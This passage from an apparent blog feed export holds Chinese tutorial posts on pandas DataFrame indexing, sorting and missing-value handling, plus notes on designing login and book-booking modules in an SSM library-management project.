&#123;<span class="hljs-string">&#x27;name&#x27;</span>:[<span class="hljs-string">&#x27;小明&#x27;</span>,<span class="hljs-string">&#x27;小花&#x27;</span>,<span class="hljs-string">&#x27;小兰&#x27;</span>,<span class="hljs-string">&#x27;小胜&#x27;</span>],<span class="hljs-string">&#x27;gender&#x27;</span>:[<span class="hljs-string">&#x27;男&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,<span class="hljs-string">&#x27;男&#x27;</span>]&#125;<br>df2 = pd.DataFrame(data)<br>print(df2)<br>data = [&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;小明&#x27;</span>,<span class="hljs-string">&#x27;gender&#x27;</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;,&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;小花&#x27;</span>,<span class="hljs-string">&#x27;gender&#x27;</span>:<span class="hljs-string">&#x27;女&#x27;</span>,<span class="hljs-string">&#x27;age&#x27;</span>:<span class="hljs-string">&#x27;22&#x27;</span>&#125;]<br>df3 = pd.DataFrame(data,index=[<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>],columns=[<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;gender&#x27;</span>,<span class="hljs-string">&#x27;age&#x27;</span>])<br>print(<span class="hljs-string">&#x27;df3=&#x27;</span>)<br>print(df3)<br>d = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:pd.Series(np.arange(<span class="hljs-number">3</span>),index=[<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>]),<br>    <span class="hljs-string">&#x27;b&#x27;</span>:pd.Series(np.arange(<span class="hljs-number">4</span>),index=[<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>])&#125;<br>df4 = pd.DataFrame(d)<br>print(<span class="hljs-string">&#x27;df4=&#x27;</span>)<br>print(df4)<br>print(<span class="hljs-string">&#x27;df2.index=&#x27;</span>,df2.index)<br>print(<span class="hljs-string">&#x27;df2.columns&#x27;</span>,df2.columns)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625145449815.png" alt="效果"></p><h3 id="十四、示例4-13更换索引"><a href="#十四、示例4-13更换索引" class="headerlink" title="十四、示例4-13更换索引"></a>十四、示例4-13更换索引</h3><p>reset_index()函数：</p><p>reset_index()函数可以还原索引，重新变为默认的整型索引，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">DataFrame.reset_index(level=<span class="hljs-literal">None</span>,drop=<span class="hljs-literal">False</span>,inplace=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>参数说明如下：</p><ol><li>level:控制了具体要还原的那个等级的索引</li><li>drop:为False，则索引列会被还原为普通列，否则会丢失</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>data = &#123;<span class="hljs-string">&#x27;name&#x27;</span>:pd.Series([<span class="hljs-string">&#x27;小明&#x27;</span>,<span class="hljs-string">&#x27;小花&#x27;</span>,<span class="hljs-string">&#x27;小兰&#x27;</span>,<span class="hljs-string">&#x27;小胜&#x27;</span>]),<br>       <span class="hljs-string">&#x27;gender&#x27;</span>:pd.Series([<span class="hljs-string">&#x27;男&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,<span class="hljs-string">&#x27;男&#x27;</span>]),<br>       <span class="hljs-string">&#x27;height&#x27;</span>:pd.Series([<span class="hljs-number">178</span>,<span class="hljs-number">165</span>,<span class="hljs-number">163</span>,<span class="hljs-number">175</span>]),<br>       <span class="hljs-string">&#x27;age&#x27;</span>:pd.Series([<span class="hljs-number">20</span>,<span class="hljs-number">22</span>,<span class="hljs-number">19</span>,<span class="hljs-number">23</span>]),<br>       <span class="hljs-string">&#x27;class&#x27;</span>:pd.Series([<span class="hljs-string">&#x27;1班&#x27;</span>,<span class="hljs-string">&#x27;1班&#x27;</span>,<span class="hljs-string">&#x27;2班&#x27;</span>,<span class="hljs-string">&#x27;1班&#x27;</span>])&#125;<br>df = pd.DataFrame(data)<br>print(df)<br>df1 = df.set_index(<span class="hljs-string">&#x27;name&#x27;</span>)<br>print(df1)<br>print(df1.reset_index())<br>print(df.set_index([<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>]))<br>print(df.set_index([<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>]).index)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625150915899.png" alt="效果"></p><h3 id="十五、示例4-21排序"><a href="#十五、示例4-21排序" class="headerlink" title="十五、示例4-21排序"></a>十五、示例4-21排序</h3><p>Pandas有两种排序方式，分别是：按标签排序和按实际值排序。</p><h4 id="sort-index-函数"><a href="#sort-index-函数" class="headerlink" title="sort_index()函数"></a>sort_index()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sort_index(axis=<span class="hljs-number">0</span>,level=<span class="hljs-literal">None</span>,ascending=<span class="hljs-literal">True</span>,inplace=<span class="hljs-literal">False</span>,kind=<span class="hljs-string">&#x27;quicksort&#x27;</span>,na_position=<span class="hljs-string">&#x27;last&#x27;</span>,sort_remaining=<span class="hljs-literal">True</span>,by=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>参数说明如下：</p><ol><li>axis：0按照行名排序；1按照列名排序。</li><li>level：默认None，否则按照给定的level顺序排列。</li><li>ascending：默认True升序排列；False降序排列。</li><li>inplace：默认False，否则排序之后的数据直接替换原来的数据集。</li><li>kind：默认quicksort，排序的方法(快速排序)。</li><li>na_position：缺失值默认排在最后{‘first’,’last’}。</li><li>by：按照那一列的数据进行排序。</li></ol><h4 id="sort-values-函数"><a href="#sort-values-函数" class="headerlink" title="sort_values()函数"></a>sort_values()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">DataFrame.sort_values(by,axis=<span class="hljs-number">0</span>,ascending=<span class="hljs-literal">True</span>,inplace=<span class="hljs-literal">False</span>,kind=<span class="hljs-string">&#x27;quicksort&#x27;</span>,na_position=<span class="hljs-string">&#x27;last&#x27;</span>)<br></code></pre></td></tr></table></figure><p>参数说明如下：</p><ol><li>axis：坐标轴，取值为0和1，默认为0.默认按照索引排序，即纵向排序，如果为1，则是横向排序。</li><li>by：是一个字符串或字符串列表，如果axis=0，则by=”列名”;如果axis=1，则by=”行名”。</li><li>ascending：布尔型，True则升序，可以是[True,False],即第一字段升序，第二个降序。</li><li>inplace：布尔型，是否用排序后的数据框替换现有的数据框。</li><li>kind：排序方法。</li><li>na_position:{‘first’,’last’},默认值为’last’，默认缺失值排在最后面。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>data = np.array([[<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>],[<span class="hljs-number">16</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">16</span>],[<span class="hljs-number">29</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>,<span class="hljs-number">25</span>]])<br>df = pd.DataFrame(data,index=[<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>],columns=[<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>])<br>print(<span class="hljs-string">&#x27;原数据帧&#x27;</span>)<br>print(df)<br>print(<span class="hljs-string">&#x27;按行索引升序&#x27;</span>)<br>print(df.sort_index())<br>print(<span class="hljs-string">&#x27;按行索引降序&#x27;</span>)<br>print(df.sort_index(ascending=<span class="hljs-literal">False</span>))<br>print(<span class="hljs-string">&#x27;按列索引升序&#x27;</span>)<br>print(df.sort_index(axis=<span class="hljs-number">1</span>))<br>print(<span class="hljs-string">&#x27;按列索引降序&#x27;</span>)<br>print(df.sort_values(by=<span class="hljs-string">&#x27;b&#x27;</span>))<br>print(df.sort_values(by=[<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]))<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625153302596.png" alt="效果"></p><h3 id="十六、数据清洗的定义"><a href="#十六、数据清洗的定义" class="headerlink" title="十六、数据清洗的定义"></a>十六、数据清洗的定义</h3><p>数据清理主要是处理原始数据中的重复数据、缺失数据和异常数据，使数据分析不受无效数据影响。</p><h3 id="十七、-缺失值（检测缺失值的方法？处理缺失值有哪几种方法？）"><a href="#十七、-缺失值（检测缺失值的方法？处理缺失值有哪几种方法？）" class="headerlink" title="十七、 缺失值（检测缺失值的方法？处理缺失值有哪几种方法？）"></a>十七、 缺失值（检测缺失值的方法？处理缺失值有哪几种方法？）</h3><p>数据采集中由于设备或人为原因可能造成的部分数据缺失，数据缺失会对数据分析造成不利影响，因此必须加以处理。</p><h4 id="检测缺失值"><a href="#检测缺失值" class="headerlink" title="检测缺失值"></a>检测缺失值</h4><p>在处理缺失值前，需要先找到缺失值，使用人工查找缺失值，效率低而且容易遗漏。isnull()函数可以检查数据中缺失值，返回一个布尔矩阵，每一个布尔值表示对应位置的数据是否缺失。</p><p>notnull()函数与isnull()函数意思相反。返回的布尔值为True时表示非缺失值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>df = pd.DataFrame(&#123;<span class="hljs-string">&#x27;a&#x27;</span>:[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,np.nan,<span class="hljs-number">4</span>],<br>                  <span class="hljs-string">&#x27;b&#x27;</span>:[<span class="hljs-number">5</span>,np.nan,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>],<br>                  <span class="hljs-string">&#x27;c&#x27;</span>:[<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,np.nan],<br>                  <span class="hljs-string">&#x27;d&#x27;</span>:[<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>]&#125;)<br>print(<span class="hljs-string">&#x27;原始数据：&#x27;</span>)<br>print(df)<br>print(df.isnull())<br>print(df.notnull())<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625154417716.png" alt="效果"></p><p>程序分析：</p><ol><li>df.isnull()函数返回df数据帧中的数据是否为NaN值的boolean型数据矩阵，如果数据为NaN值，矩阵对应位置为True，否则为False</li><li>df.notnull()函数与df.isnull()函数返回的boolean值正好相反</li></ol><h4 id="处理缺失值"><a href="#处理缺失值" class="headerlink" title="处理缺失值"></a>处理缺失值</h4><p>缺失值处理主要有4种处理方法：</p><ol><li>删除法</li><li>固定值替换法</li><li>填充法</li><li>插值法</li></ol><h5 id="删除法"><a href="#删除法" class="headerlink" title="删除法"></a>删除法</h5><p>当有缺失值时，删除是最简单的处理方法，使用删除法要考虑两种情况：只要有NaN值就删除；都是NaN值才删除。删除NaN值数据通过函数dropna()实现。</p><ul><li>参数how有两个取值：any表示如果存在任何NaN值，则删除该行数据，all表示如果所有的值均为NaN值，才删除该行。</li><li>参数thresh是一个int值，默认值为None，表示要求每排至少N个非NAN值。</li><li>参数subset是一个类似数组，表示全都是NaN值的集合。</li><li>参数inplace是一个boolean，默认值False，如果为True，则返回None，但是原数据被修改。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>df = pd.DataFrame(&#123;<span class="hljs-string">&#x27;a&#x27;</span>:[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,np.nan,<span class="hljs-number">4</span>],<br>                  <span class="hljs-string">&#x27;b&#x27;</span>:[<span class="hljs-number">5</span>,np.nan,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>],<br>                  <span class="hljs-string">&#x27;c&#x27;</span>:[<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,np.nan],<br>                  <span class="hljs-string">&#x27;d&#x27;</span>:[<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>]&#125;)<br>print(<span class="hljs-string">&#x27;原数据：&#x27;</span>)<br>print(df)<br>print(<span class="hljs-string">&#x27;删除包含NaN值的行：&#x27;</span>,df.dropna())<br>print(<span class="hljs-string">&#x27;删除包含NaN值的列：&#x27;</span>,df.dropna(axis=<span class="hljs-number">1</span>))<br>print(<span class="hljs-string">&#x27;删除都是NaN值的行：&#x27;</span>,df.dropna(how=<span class="hljs-string">&#x27;all&#x27;</span>))<br>df.iloc[<span class="hljs-number">0</span>]=np.nan<br>print(<span class="hljs-string">&#x27;第0行都是NaN值，删除：&#x27;</span>,df.dropna(how=<span class="hljs-string">&#x27;all&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625161832645.png" alt="效果"></p><h5 id="固定值替换法"><a href="#固定值替换法" class="headerlink" title="固定值替换法"></a>固定值替换法</h5><p>使用固定值替换NaN值，是一种简单的处理方法，但是效果不好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>df = pd.DataFrame(&#123;<span class="hljs-string">&#x27;a&#x27;</span>:[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,np.nan,<span class="hljs-number">4</span>],<br>                  <span class="hljs-string">&#x27;b&#x27;</span>:[<span class="hljs-number">5</span>,np.nan,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>],<br>                  <span class="hljs-string">&#x27;c&#x27;</span>:[<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,np.nan],<br>                  <span class="hljs-string">&#x27;d&#x27;</span>:[<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>]&#125;)<br>print(<span class="hljs-string">&#x27;原数据：&#x27;</span>)<br>print(df)<br>print(df.replace(np.nan,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625162809332.png" alt="效果"></p><h5 id="填充法"><a href="#填充法" class="headerlink" title="填充法"></a>填充法</h5><p>使用fillna()函数来填充NaN值，是一种常用的处理方法。</p><p>参数nethod取值：backfill、bfill、pad、ffill、None，默认值：None。pad、ffill表示向前填充，backfill、bfill表示向后填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>df = pd.DataFrame(&#123;<span class="hljs-string">&#x27;a&#x27;</span>:[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,np.nan,<span class="hljs-number">4</span>],<br>                  <span class="hljs-string">&#x27;b&#x27;</span>:[<span class="hljs-number">5</span>,np.nan,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>],<br>                  <span class="hljs-string">&#x27;c&#x27;</span>:[<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,np.nan],<br>                  <span class="hljs-string">&#x27;d&#x27;</span>:[<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>]&#125;)<br>print(<span class="hljs-string">&#x27;原数据：&#x27;</span>)<br>print(df)<br>print(df.fillna(<span class="hljs-number">0</span>)) <span class="hljs-comment">#固定值</span><br>print(df.fillna(df.mean())) <span class="hljs-comment">#平均值</span><br>print(df.fillna(method=<span class="hljs-string">&#x27;bfill&#x27;</span>)) <span class="hljs-comment">#最近邻</span><br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625163156707.png" alt="效果"></p><h5 id="插值法-牛逼的方法"><a href="#插值法-牛逼的方法" class="headerlink" title="插值法(牛逼的方法)"></a>插值法(牛逼的方法)</h5><p>上述处理缺失值的方法存在明显的缺陷，尤其是在数据量不够丰富时，删除法基本上是不具有可行性的，。除了上述方法外，还有一种效果更好的方法——插值法。</p><p>插值法有3种常用的方法：线性插值，多项式插值和样条插值。</p><ul><li>线性插值是根据已知数值构建线性方程组，通过求解线性方程组获取缺失值；</li><li>多项式插值是通过拟合多项式，通过多项式求解缺失值，多项式插值中最常用的是拉格朗日插值法和牛顿插值法；</li><li>样条插值是通过可变样条做出一条经过一系列点的光滑曲线的插值方法；</li></ul><p>线性插值和多项式插值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> scipy.interpolate <span class="hljs-keyword">as</span> interpolate<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>%matplotlib inline<br>a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]<br>b = [<span class="hljs-number">10</span>,<span class="hljs-number">16</span>,<span class="hljs-number">21</span>,<span class="hljs-number">32</span>,<span class="hljs-number">35</span>,<span class="hljs-number">43</span>,<span class="hljs-number">58</span>,<span class="hljs-number">62</span>,<span class="hljs-number">67</span>,<span class="hljs-number">70</span>]<br>print(a)<br>print(b)<br>linear=interpolate.interp1d(a,b,kind=<span class="hljs-string">&#x27;linear&#x27;</span>) <span class="hljs-comment">#注意这里是interp1d，是数字1不是字母l</span><br>plt.plot(linear([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]),<span class="hljs-string">&#x27;-.&#x27;</span>)<br>print(<span class="hljs-string">&#x27;线性插值法求出的ss[7:9=]&#x27;</span>,linear([<span class="hljs-number">7</span>,<span class="hljs-number">8</span>]))<br>lagrange=interpolate.lagrange(a,b)<br>plt.plot(lagrange([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]),<span class="hljs-string">&#x27;--&#x27;</span>)<br>print(<span class="hljs-string">&#x27;拉格朗日插值法求出的ss[2]=&#x27;</span>,lagrange([<span class="hljs-number">7</span>,<span class="hljs-number">8</span>]))<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625165141929.png" alt="效果"></p><p>样条插值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scipy.interpolate <span class="hljs-keyword">as</span> interpolate<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>%matplotlib inline<br>x = np.linspace(-np.pi,np.pi,<span class="hljs-number">10</span>)<br>y = np.sin(x)<br>plt.plot(x,y)<br>tck = interpolate.splrep(x,y)<br>x_new = np.linspace(-np.pi,np.pi,<span class="hljs-number">100</span>)<br>y_spine = interpolate.splev(x_new,tck)<br>plt.figure()<br>plt.plot(x_new,y_spine)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625165841999.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 期末复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于SSM图书管理项目的图书预约功能实现逻辑</title>
      <link href="/2021/06/16/%E5%9F%BA%E4%BA%8ESSM%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%9B%BE%E4%B9%A6%E9%A2%84%E7%BA%A6%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E9%80%BB%E8%BE%91/"/>
      <url>/2021/06/16/%E5%9F%BA%E4%BA%8ESSM%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%9B%BE%E4%B9%A6%E9%A2%84%E7%BA%A6%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在写这篇博客时，图书管理系统的图书管理模块、用户管理模块已经实现。前两个模块已经写好了完善的Service，所以接下来在写预约模块的时候会省很多功夫。下面是一份简单的预约模块构造流程图：</p><p><img src="/images/JavaScript/date_book_flush_chart-1623824321875.png"></p><h2 id="预约模块各功能的设计"><a href="#预约模块各功能的设计" class="headerlink" title="预约模块各功能的设计"></a>预约模块各功能的设计</h2><h3 id="登录逻辑"><a href="#登录逻辑" class="headerlink" title="登录逻辑"></a>登录逻辑</h3><p>图书管理模块与用户管理模块所使用的登录逻辑相同，即调用adminService来获取管理员的信息。但对于普通用户而言，本项目要设计一个新的Service出来，即user_login_Service。之所以起这种沙雕名字，是因为之前在为pojo下reader_info设计的时候，就已经使用了userService这一名字，它已经与Mapper绑定了，故另辟蹊径。</p><p>我们要做的准备是：</p><ol><li>写出新的user_login_Service与对应的user_login_Mapper</li><li>Controller依然沿用Book_manage，只需要导入user_login_Service和对应的pojo-&gt;reader_card</li><li>在Spring-service.xml中绑定Mapper</li><li>当然了，在写好后端前，要有个前端的jsp，视图层命名为user_login，继续沿用先前模块的登录设计</li><li>还要准备好登陆成功后跳转到的jsp页面，依然沿用先前的设计</li></ol><p>做好准备后，要在Controller里面写出登录逻辑，逻辑流程图如下：</p><p><img src="/images/JavaScript/user_login_flush_chart.png"></p><h3 id="预约图书逻辑"><a href="#预约图书逻辑" class="headerlink" title="预约图书逻辑"></a>预约图书逻辑</h3><p>预约图书逻辑需要用到的模块比较多，当然，这是相较于之前的模块开发而言的。先盘点一下要使用的模块：</p><ol><li>图书管理模块的Service</li><li>预约模块的Service<ul><li>lend_list对应的Service</li><li>login_user对应的Service</li></ul></li></ol><p>上述是初步设想的要调用的Service，在实际开发过程中可能调用更多的Service，开发过程中再补充。如果很幸运地，我们只用到了这几个Service，那岂不是美滋滋。</p><p>下面是预约图书的逻辑流程图：</p><p><img src="/images/JavaScript/lend_book_detail_flush_chart.png"></p><p>我们要做的准备是：</p><ol><li>写出lend_list_Service，其对应的lend_Mapper，在Spring-service中配置bean。</li><li>沿用book_manage得到Controller，import相应的类(lend_list_Service)。并写出预约逻辑。</li><li>前端写出预约图书的页面，上部分为搜索框，下部分为对应的搜索结果和预约按钮。分为两个form表单。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> 框架 </tag>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于SSM图书管理项目的图书管理各模块功能实现逻辑</title>
      <link href="/2021/06/15/%E5%9F%BA%E4%BA%8ESSM%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%90%84%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E9%80%BB%E8%BE%91/"/>
      <url>/2021/06/15/%E5%9F%BA%E4%BA%8ESSM%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%90%84%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="关于登录逻辑"><a href="#关于登录逻辑" class="headerlink" title="关于登录逻辑"></a>关于登录逻辑</h2><p>登录逻辑的实现，具体流程图如下：</p><p><img src="/images/JavaScript/login_flush_chart.png"></p><p>在Controller层的核心代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hu.controller;<br><br><span class="hljs-keyword">import</span> com.hu.pojo.admin;<br><span class="hljs-keyword">import</span> com.hu.pojo.book_info;<br><span class="hljs-keyword">import</span> com.hu.service.BookService;<br><span class="hljs-keyword">import</span> com.hu.service.adminService;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-meta">@SuppressWarnings(&quot;all&quot;)</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/book&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">adminController</span> </span>&#123;<br>    <span 